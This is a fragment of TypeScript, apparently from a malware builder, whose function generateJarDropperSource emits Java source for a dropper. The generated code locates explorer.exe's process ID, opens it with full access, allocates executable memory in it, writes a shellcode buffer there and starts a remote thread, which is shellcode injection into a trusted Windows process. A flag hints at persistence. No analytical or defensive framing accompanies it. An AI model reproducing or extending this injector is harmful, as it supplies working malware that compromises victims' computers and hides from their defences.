...
function generateJarDropperSource(jarPersist: boolean): string {
  ...
  return [
    ...
    "    int xpid=-1;",
    "    try{",
    "      Process tp=new ProcessBuilder(\"tasklist\",\"/fo\",\"csv\",\"/fi\",\"imagename eq explorer.exe\").start();",
    "      BufferedReader tbr=new BufferedReader(new InputStreamReader(tp.getInputStream()));",
    "      String tl;tbr.readLine();",
    "      while((tl=tbr.readLine())!=null){",
    "        String[]pp=tl.replace(\"\\\"\",\"\").split(\",\");",
    "        if(pp.length>=2)try{xpid=Integer.parseInt(pp[1].trim());break;}catch(Exception e2){}",
    "      }",
    "      tbr.close();",
    "    }catch(Exception e3){log(\"tasklist err: \"+e3);}",
    "    log(\"explorer pid=\"+xpid);",
    "    if(xpid<0)return;",
    ...
    "    Object fOP=gf.invoke(null,\"kernel32\",\"OpenProcess\");",
    "    Object hp=iv.invoke(fOP,PC,new Object[]{0x1FFFFF,false,xpid});",
    "    log(\"hproc=\"+hp);",
    "    if(hp==null||hp.equals(NP))return;",
    "    Object fVA=gf.invoke(null,\"kernel32\",\"VirtualAllocEx\");",
    "    Object ra=iv.invoke(fVA,PC,new Object[]{hp,NP,(long)sc.length,0x3000,0x40});",
    "    log(\"raddr=\"+ra);",
    ...
    "    iv.invoke(fWM,Integer.class,new Object[]{hp,ra,mem,(long)sc.length,NP});",
    "    log(\"written to explorer\");",
    "    Object fCT=gf.invoke(null,\"kernel32\",\"CreateRemoteThread\");",
    "    Object ht=iv.invoke(fCT,PC,new Object[]{hp,NP,0L,ra,NP,0,NP});",
    "    log(\"thread=\"+ht);",
    "  }",
    "}",
  ].join("\n");
